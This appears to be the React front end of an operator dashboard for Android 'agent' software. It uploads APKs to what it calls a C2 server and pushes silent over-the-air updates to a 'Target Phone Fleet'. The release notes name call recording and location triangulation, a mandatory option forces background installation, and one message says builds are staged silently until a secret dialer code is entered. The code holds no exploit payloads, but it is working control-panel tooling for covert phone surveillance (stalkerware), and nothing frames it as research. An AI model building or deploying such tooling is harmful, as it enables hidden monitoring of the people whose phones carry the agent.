import React, { useState, useEffect } from 'react';
import { 
  Upload, 
  Smartphone, 
  Zap, 
  ShieldCheck, 
  Download, 
  RefreshCw, 
  CheckCircle2, 
  AlertCircle, 
  FileText, 
  Key, 
  Layers, 
  Clock, 
  Radio, 
  Lock, 
  Check, 
  ChevronRight,
  Server,
  Activity,
  Cpu
} from 'lucide-react';
import axios from 'axios';

interface ReleaseModel {
  id: string;
  versionCode: number;
  versionName: string;
  apkUrl: string;
  sha256: string;
  isMandatory: boolean;
  releaseNotes: string;
  sizeBytes?: number;
  fileName?: string;
  createdAt: string;
}

interface UpdateJobModel {
  id: string;
  deviceId: string;
  releaseId?: string;
  versionName?: string;
  status: 'PENDING' | 'DOWNLOADING' | 'VERIFYING' | 'INSTALLING' | 'STAGED_FOR_DIALER' | 'COMPLETED' | 'FAILED';
  progress: number;
  errorMessage?: string;
  updatedAt?: string;
}

const API_BASE = 'http://localhost:3000/api/v1';

export default function App() {
  const [activeTab, setActiveTab] = useState<'releases' | 'fleet' | 'logs'>('releases');
  const [releases, setReleases] = useState<ReleaseModel[]>([]);
  const [jobs, setJobs] = useState<UpdateJobModel[]>([]);
  const [isLoading, setIsLoading] = useState(false);

  // Upload Form State
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [versionName, setVersionName] = useState('v8.2.1');
  const [versionCode, setVersionCode] = useState('221');
  const [releaseNotes, setReleaseNotes] = useState('Call Recording separation, location triangulation enhancement, memory optimization.');
  const [isMandatory, setIsMandatory] = useState(false);
  const [uploadProgress, setUploadProgress] = useState<number | null>(null);
  const [statusMsg, setStatusMsg] = useState<{ text: string; type: 'success' | 'error' | 'info' } | null>(null);

  // Fleet Devices (Sample paired fleet overview)
  const [devices] = useState([
    {
      deviceId: 'ac7189fd-ec87-40a0-9f8a-4d93e01aa73a',
      alias: "Child's Samsung Galaxy S23",
      currentVersion: 'v8.1.0',
      versionCode: 210,
      isDeviceOwner: true,
      battery: 88,
      status: 'ONLINE'
    },
    {
      deviceId: 'dev_pixel7_pro_test',
      alias: "Parent Admin Test Pixel 7",
      currentVersion: 'v8.0.0',
      versionCode: 200,
      isDeviceOwner: false,
      battery: 64,
      status: 'ONLINE'
    }
  ]);

  // Fetch Releases & Jobs on mount
  useEffect(() => {
    fetchReleases();
    fetchJobs();
    const interval = setInterval(() => {
      fetchJobs();
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const fetchReleases = async () => {
    try {
      const res = await axios.get(`${API_BASE}/updates/releases`);
      setReleases(res.data || []);
    } catch (e) {
      console.warn('Backend offline or using fallback releases');
    }
  };

  const fetchJobs = async () => {
    try {
      const res = await axios.get(`${API_BASE}/updates/jobs`);
      setJobs(res.data || []);
    } catch (e) {
      // Quiet fail
    }
  };

  const handleUploadApk = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedFile) {
      setStatusMsg({ text: 'Please select an .apk binary file to upload.', type: 'error' });
      return;
    }

    const formData = new FormData();
    formData.append('file', selectedFile);
    formData.append('versionName', versionName);
    formData.append('versionCode', versionCode);
    formData.append('releaseNotes', releaseNotes);
    formData.append('isMandatory', isMandatory ? 'true' : 'false');

    try {
      setUploadProgress(0);
      setStatusMsg({ text: 'Uploading APK binary and generating SHA-256 checksum...', type: 'info' });

      const res = await axios.post(`${API_BASE}/updates/upload`, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        onUploadProgress: (progressEvent) => {
          if (progressEvent.total) {
            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
            setUploadProgress(percent);
          }
        }
      });

      setUploadProgress(100);
      setStatusMsg({ 
        text: `✓ APK Released Successfully! Build ${res.data.versionCode} (${res.data.versionName}) Published with SHA-256: ${res.data.sha256.substring(0, 16)}...`, 
        type: 'success' 
      });

      setSelectedFile(null);
      fetchReleases();
    } catch (err: any) {
      setStatusMsg({ 
        text: `Upload failed: ${err.response?.data?.message || err.message}`, 
        type: 'error' 
      });
    } finally {
      setTimeout(() => setUploadProgress(null), 3000);
    }
  };

  const handleTriggerUpdate = async (deviceId: string, releaseId?: string) => {
    try {
      setStatusMsg({ text: `Dispatching OTA Update SSE command to device ${deviceId.substring(0, 12)}...`, type: 'info' });
      const res = await axios.post(`${API_BASE}/updates/trigger`, { deviceId, releaseId });
      setStatusMsg({ text: `✓ ${res.data.message}`, type: 'success' });
      fetchJobs();
    } catch (err: any) {
      setStatusMsg({ text: `Failed to dispatch update: ${err.message}`, type: 'error' });
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans flex flex-col selection:bg-indigo-500 selection:text-white">
      {/* Top Header */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-600 to-violet-500 flex items-center justify-center shadow-lg shadow-indigo-500/20 text-white font-bold">
              <Zap className="w-5 h-5 fill-current" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="font-extrabold text-base tracking-tight text-white">Super Admin Control Center</h1>
                <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-bold uppercase tracking-wider">
                  OTA Engine Active
                </span>
              </div>
              <p className="text-xs text-slate-400">Android Agent Binary Release Publisher & Remote Deployment Fleet Engine</p>
            </div>
          </div>

          {/* Quick Metrics */}
          <div className="hidden md:flex items-center gap-6 text-xs">
            <div className="flex items-center gap-2 bg-slate-800/80 border border-slate-700 px-3 py-1.5 rounded-lg">
              <Server className="w-4 h-4 text-indigo-400" />
              <span className="text-slate-400">Latest Release:</span>
              <span className="font-mono text-emerald-400 font-bold">
                {releases[releases.length - 1]?.versionName || 'v8.2.0'}
              </span>
            </div>
            <div className="flex items-center gap-2 bg-slate-800/80 border border-slate-700 px-3 py-1.5 rounded-lg">
              <Activity className="w-4 h-4 text-emerald-400 animate-pulse" />
              <span className="text-slate-400">OTA Stream:</span>
              <span className="text-emerald-400 font-bold">SSE Operational</span>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-6 space-y-6">
        
        {/* Status Toast Banner */}
        {statusMsg && (
          <div className={`p-4 rounded-xl border flex items-center justify-between gap-3 text-xs font-medium shadow-md transition-all ${
            statusMsg.type === 'success' ? 'bg-emerald-950/80 border-emerald-500/40 text-emerald-200' :
            statusMsg.type === 'error' ? 'bg-rose-950/80 border-rose-500/40 text-rose-200' :
            'bg-indigo-950/80 border-indigo-500/40 text-indigo-200'
          }`}>
            <div className="flex items-center gap-2">
              {statusMsg.type === 'success' && <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />}
              {statusMsg.type === 'error' && <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />}
              {statusMsg.type === 'info' && <RefreshCw className="w-4 h-4 text-indigo-400 animate-spin shrink-0" />}
              <span>{statusMsg.text}</span>
            </div>
            <button onClick={() => setStatusMsg(null)} className="text-slate-400 hover:text-white text-base">×</button>
          </div>
        )}

        {/* Tab Navigation */}
        <div className="flex items-center gap-2 border-b border-slate-800 pb-2">
          <button
            onClick={() => setActiveTab('releases')}
            className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
              activeTab === 'releases'
                ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
            }`}
          >
            <Upload className="w-4 h-4" />
            <span>Upload APK & Publish Release</span>
          </button>

          <button
            onClick={() => setActiveTab('fleet')}
            className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
              activeTab === 'fleet'
                ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
            }`}
          >
            <Smartphone className="w-4 h-4" />
            <span>Remote Fleet Deployment (OTA)</span>
          </button>

          <button
            onClick={() => setActiveTab('logs')}
            className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-bold text-xs transition-all ${
              activeTab === 'logs'
                ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-600/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
            }`}
          >
            <Radio className="w-4 h-4" />
            <span>OTA Live Telemetry Logs</span>
          </button>
        </div>

        {/* TAB 1: UPLOAD APK & RELEASES */}
        {activeTab === 'releases' && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            {/* APK Upload Form */}
            <div className="lg:col-span-1 bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-5 shadow-xl">
              <div className="flex items-center gap-3 border-b border-slate-800 pb-3">
                <div className="w-8 h-8 rounded-lg bg-indigo-500/20 text-indigo-400 flex items-center justify-center">
                  <Upload className="w-4 h-4" />
                </div>
                <div>
                  <h2 className="font-bold text-sm text-white">Upload Agent Binary (.apk)</h2>
                  <p className="text-[11px] text-slate-400">Publish new Android update build to C2 server</p>
                </div>
              </div>

              <form onSubmit={handleUploadApk} className="space-y-4">
                
                {/* Drag & Drop File Selector */}
                <div className="border-2 border-dashed border-slate-700 hover:border-indigo-500 rounded-xl p-5 text-center bg-slate-950/60 transition-all cursor-pointer">
                  <input
                    type="file"
                    accept=".apk"
                    onChange={(e) => setSelectedFile(e.target.files?.[0] || null)}
                    className="hidden"
                    id="apk-file-input"
                  />
                  <label htmlFor="apk-file-input" className="cursor-pointer space-y-2 block">
                    <div className="w-10 h-10 rounded-full bg-slate-800 text-indigo-400 flex items-center justify-center mx-auto">
                      <FileText className="w-5 h-5" />
                    </div>
                    {selectedFile ? (
                      <div className="space-y-0.5">
                        <span className="font-mono text-xs text-emerald-400 font-bold block truncate max-w-[200px] mx-auto">
                          {selectedFile.name}
                        </span>
                        <span className="text-[10px] text-slate-400">
                          {(selectedFile.size / (1024 * 1024)).toFixed(2)} MB • Ready for upload
                        </span>
                      </div>
                    ) : (
                      <div>
                        <span className="text-xs font-semibold text-indigo-400 hover:underline">Click to browse app-debug.apk</span>
                        <p className="text-[10px] text-slate-500 mt-1">Supports standard .apk binary packages</p>
                      </div>
                    )}
                  </label>
                </div>

                {/* Progress bar */}
                {uploadProgress !== null && (
                  <div className="space-y-1.5">
                    <div className="flex justify-between text-[11px] font-semibold">
                      <span className="text-slate-400">Uploading & Hashing SHA-256...</span>
                      <span className="text-indigo-400 font-mono">{uploadProgress}%</span>
                    </div>
                    <div className="w-full bg-slate-800 h-2 rounded-full overflow-hidden">
                      <div 
                        className="bg-indigo-500 h-full transition-all duration-300 rounded-full"
                        style={{ width: `${uploadProgress}%` }}
                      />
                    </div>
                  </div>
                )}

                {/* Form Inputs */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-[11px] font-bold text-slate-400 block mb-1">Version Name</label>
                    <input
                      type="text"
                      value={versionName}
                      onChange={(e) => setVersionName(e.target.value)}
                      placeholder="e.g. v8.2.1"
                      className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-indigo-500"
                    />
                  </div>

                  <div>
                    <label className="text-[11px] font-bold text-slate-400 block mb-1">Version Code</label>
                    <input
                      type="text"
                      value={versionCode}
                      onChange={(e) => setVersionCode(e.target.value)}
                      placeholder="e.g. 221"
                      className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-indigo-500"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-[11px] font-bold text-slate-400 block mb-1">Release Notes</label>
                  <textarea
                    rows={3}
                    value={releaseNotes}
                    onChange={(e) => setReleaseNotes(e.target.value)}
                    placeholder="Describe patch fixes, new feature collectors..."
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-indigo-500"
                  />
                </div>

                {/* Mandatory Checkbox */}
                <label className="flex items-center gap-2.5 p-3 rounded-xl bg-slate-950/80 border border-slate-800 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={isMandatory}
                    onChange={(e) => setIsMandatory(e.target.checked)}
                    className="w-4 h-4 rounded text-indigo-600 focus:ring-0 bg-slate-900 border-slate-700"
                  />
                  <div>
                    <span className="text-xs font-bold text-white block">Mandatory Super Admin Patch</span>
                    <span className="text-[10px] text-slate-400 block">Forces immediate background installation on check-in</span>
                  </div>
                </label>

                <button
                  type="submit"
                  disabled={uploadProgress !== null}
                  className="w-full py-2.5 rounded-xl bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-bold text-xs shadow-lg shadow-indigo-600/30 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  <Upload className="w-4 h-4" />
                  <span>Publish Release to OTA Server</span>
                </button>
              </form>
            </div>

            {/* Published Releases Table */}
            <div className="lg:col-span-2 bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-4 shadow-xl">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center">
                    <Layers className="w-4 h-4" />
                  </div>
                  <div>
                    <h2 className="font-bold text-sm text-white">Published Release Catalog</h2>
                    <p className="text-[11px] text-slate-400">All available APK binaries hosted on server</p>
                  </div>
                </div>
                <button onClick={fetchReleases} className="text-xs font-semibold text-slate-400 hover:text-white flex items-center gap-1">
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>Refresh</span>
                </button>
              </div>

              <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
                {releases.map((rel) => (
                  <div 
                    key={rel.id}
                    className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 hover:border-slate-700 transition-all space-y-2.5"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2.5">
                        <span className="font-mono font-extrabold text-sm text-white">{rel.versionName}</span>
                        <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-mono text-[10px]">
                          Build {rel.versionCode}
                        </span>
                        {rel.isMandatory ? (
                          <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40 text-[10px] font-bold">
                            Mandatory Patch
                          </span>
                        ) : (
                          <span className="px-2 py-0.5 rounded bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 text-[10px] font-bold">
                            Optional Release
                          </span>
                        )}
                      </div>

                      <a
                        href={rel.apkUrl}
                        target="_blank"
                        rel="noreferrer"
                        className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-indigo-300 flex items-center gap-1.5"
                      >
                        <Download className="w-3.5 h-3.5" />
                        <span>Download APK</span>
                      </a>
                    </div>

                    <p className="text-xs text-slate-300 leading-relaxed">{rel.releaseNotes}</p>

                    <div className="pt-2 border-t border-slate-900/80 flex flex-wrap items-center justify-between gap-2 text-[10px] font-mono text-slate-400">
                      <div className="flex items-center gap-2">
                        <Key className="w-3 h-3 text-slate-500" />
                        <span className="truncate max-w-[320px] text-slate-300">SHA-256: {rel.sha256}</span>
                      </div>
                      <div className="text-slate-400">
                        {new Date(rel.createdAt).toLocaleDateString()}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

          </div>
        )}

        {/* TAB 2: REMOTE FLEET DEPLOYMENT */}
        {activeTab === 'fleet' && (
          <div className="space-y-6">
            <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-4 shadow-xl">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-indigo-500/20 text-indigo-400 flex items-center justify-center">
                    <Smartphone className="w-4 h-4" />
                  </div>
                  <div>
                    <h2 className="font-bold text-sm text-white">Target Phone Fleet (Remote Update Dispatcher)</h2>
                    <p className="text-[11px] text-slate-400">Direct instant OTA update triggers over active SSE policy stream</p>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {devices.map((dev) => {
                  const latestRelease = releases[releases.length - 1];
                  const hasPendingUpdate = latestRelease && dev.versionCode < latestRelease.versionCode;
                  const activeJob = jobs.find(j => j.deviceId === dev.deviceId);

                  return (
                    <div key={dev.deviceId} className="p-5 rounded-2xl bg-slate-950/80 border border-slate-800 space-y-4 shadow-lg">
                      <div className="flex items-start justify-between">
                        <div>
                          <div className="flex items-center gap-2">
                            <h3 className="font-bold text-sm text-white">{dev.alias}</h3>
                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                          </div>
                          <span className="font-mono text-[10px] text-slate-500">{dev.deviceId}</span>
                        </div>

                        {dev.isDeviceOwner ? (
                          <span className="px-2.5 py-1 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[10px] font-bold">
                            Device Owner (MDM)
                          </span>
                        ) : (
                          <span className="px-2.5 py-1 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[10px] font-bold">
                            Standard App
                          </span>
                        )}
                      </div>

                      <div className="grid grid-cols-2 gap-2 text-xs bg-slate-900/60 p-3 rounded-xl border border-slate-800">
                        <div>
                          <span className="text-[10px] text-slate-400 block">Current Installed</span>
                          <span className="font-mono font-bold text-white">{dev.currentVersion} (Build {dev.versionCode})</span>
                        </div>
                        <div>
                          <span className="text-[10px] text-slate-400 block">Latest Server Build</span>
                          <span className="font-mono font-bold text-emerald-400">{latestRelease?.versionName || 'v8.2.0'}</span>
                        </div>
                      </div>

                      {/* Live Job Progress Telemetry Bar */}
                      {activeJob && (
                        <div className="p-3 rounded-xl bg-indigo-950/60 border border-indigo-500/30 space-y-1.5">
                          <div className="flex justify-between text-[11px] font-bold">
                            <span className="text-indigo-300">Status: {activeJob.status}</span>
                            <span className="text-indigo-400 font-mono">{activeJob.progress}%</span>
                          </div>
                          <div className="w-full bg-slate-900 h-2 rounded-full overflow-hidden">
                            <div 
                              className="bg-gradient-to-r from-indigo-500 to-emerald-400 h-full transition-all duration-300 rounded-full"
                              style={{ width: `${activeJob.progress}%` }}
                            />
                          </div>
                          {activeJob.status === 'STAGED_FOR_DIALER' && (
                            <p className="text-[10px] text-amber-300">
                              ℹ️ Staged silently on phone. Will be installed when parent opens secret dialer *#*#2013#*#*.
                            </p>
                          )}
                        </div>
                      )}

                      <button
                        onClick={() => handleTriggerUpdate(dev.deviceId, latestRelease?.id)}
                        className={`w-full py-2.5 rounded-xl font-bold text-xs shadow-md transition-all flex items-center justify-center gap-2 ${
                          hasPendingUpdate
                            ? 'bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white'
                            : 'bg-indigo-600 hover:bg-indigo-500 text-white'
                        }`}
                      >
                        <Zap className="w-4 h-4" />
                        <span>{hasPendingUpdate ? `Push Update ${latestRelease.versionName}` : 'Re-Deploy OTA Update'}</span>
                      </button>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        )}

        {/* TAB 3: LIVE LOGS */}
        {activeTab === 'logs' && (
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-4 shadow-xl">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-indigo-500/20 text-indigo-400 flex items-center justify-center">
                  <Radio className="w-4 h-4" />
                </div>
                <div>
                  <h2 className="font-bold text-sm text-white">Live OTA Telemetry Callback Stream</h2>
                  <p className="text-[11px] text-slate-400">Real-time installation progress reports received from target agent phones</p>
                </div>
              </div>
            </div>

            <div className="font-mono text-xs bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-2 max-h-[400px] overflow-y-auto">
              {jobs.length === 0 ? (
                <div className="text-slate-500 text-center py-6">No active OTA update jobs recorded yet.</div>
              ) : (
                jobs.map(j => (
                  <div key={j.id} className="p-2 border-b border-slate-900 flex justify-between items-center text-slate-300">
                    <div>
                      <span className="text-indigo-400 font-bold">[{j.id}]</span> Device {j.deviceId.substring(0, 12)}... ➔ Status: <span className="text-emerald-400 font-bold">{j.status}</span> ({j.progress}%)
                    </div>
                    <span className="text-[10px] text-slate-500">{j.updatedAt ? new Date(j.updatedAt).toLocaleTimeString() : 'Just now'}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        )}

      </main>
    </div>
  );
}
